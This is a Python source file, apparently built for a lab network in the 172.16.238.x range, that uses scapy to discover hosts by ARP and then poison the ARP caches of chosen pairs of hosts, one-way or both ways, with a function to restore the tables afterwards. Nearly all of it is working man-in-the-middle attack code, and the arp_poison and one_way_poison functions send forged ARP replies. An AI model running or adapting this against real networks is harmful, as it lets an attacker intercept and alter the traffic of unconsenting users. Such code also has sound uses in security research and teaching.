from scapy.all import * 

host_list = {}

WRAPPER_MAPPINGS = {"172.16.238.10" : "172.16.238.110",
                    "172.16.238.11" : "172.16.238.111",
                    "172.16.238.12" : "172.16.238.112",
                    "172.16.238.20" : "172.16.238.120",
                    "172.16.238.21" : "172.16.238.121",
                    "172.16.238.22" : "172.16.238.122",
                    "172.16.238.23" : "172.16.238.123",
                    "172.16.238.24" : "172.16.238.124"
                    }

# Keep a socket open so that scapy doesn't open and close a new socket with every send
s = conf.L3socket(iface='eth0')

def discovery(network):
    print("Begin host discovery in network " + network)
    arp = ARP(pdst=network)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_packet = ether/arp

    result = srp(arp_packet, timeout=3, verbose=0, iface='eth0')[0]

    for sent, received in result:
        # for each response, append ip and mac address to `clients` list
        host_list[received.psrc] = received.hwsrc
    print("Discovered hosts: \n " + str(host_list))

def get_mac(target_ip):
    arp_packet= ARP(op="who-has", pdst=target_ip)
    ans, unans= sr(arp_packet, timeout=3 , verbose= False)
    print("MAC address of " + target_ip + " is " + ans[0][1].hwsrc)
    return ans[0][1].hwsrc

def arp_poison(client_ip, target_ip):
    print("Poisoning " + target_ip + " <==> " + client_ip)
    host_arp = ARP(op='is-at', psrc=client_ip, pdst=target_ip,  hwdst=host_list[target_ip]) #poison target pretending to be the client
    client_arp = ARP(op='is-at', psrc=target_ip, pdst=client_ip, hwdst=host_list[client_ip]) #poison the client pretending to be the target
    s.send(host_arp)
    s.send(client_arp)

def one_way_poison(client_ip, target_ip):
    print("One-way poisoning " + client_ip + " ==> " + target_ip)
    client_arp = ARP(op='is-at', psrc=target_ip, pdst=client_ip, hwdst=host_list[client_ip])
    s.send(client_arp)

def restore_tables(client_ip, target_ip):
    print("Restoring ARP cache in targets " + target_ip + "<==>" + client_ip)
    send(ARP(op = 2, pdst = target_ip, psrc = client_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = host_list[client_ip]), count = 7)
    send(ARP(op = 2, pdst = client_ip, psrc = target_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = host_list[target_ip]), count = 7)